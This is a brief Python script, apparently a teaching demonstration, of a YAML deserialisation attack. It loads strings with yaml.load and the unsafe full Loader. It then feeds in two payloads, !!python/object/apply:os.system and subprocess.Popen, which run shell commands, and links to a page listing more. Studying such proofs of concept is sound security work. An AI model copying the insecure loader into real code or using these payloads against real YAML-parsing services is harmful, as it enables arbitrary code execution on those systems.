import yaml
from yaml import Loader
from typing import Dict

# Arbitrary code execution as a service.
def deserialise_service_config(config: str) -> Dict:
    try:
        return yaml.load(config, Loader=Loader)
    except:
        print("An error occurred")

# Spice up my life.
deserialise_service_config("""
service:
    !!python/object/apply:os.system
    ["echo 'Malicious code executed'"]
""")

# Gonna have a bad day
deserialise_service_config("""
!!python/object/apply:subprocess.Popen
- ls""")

# More payloads for abusing yaml deserialisation
# https://net-square.com/yaml-deserialization-attack-in-python.html
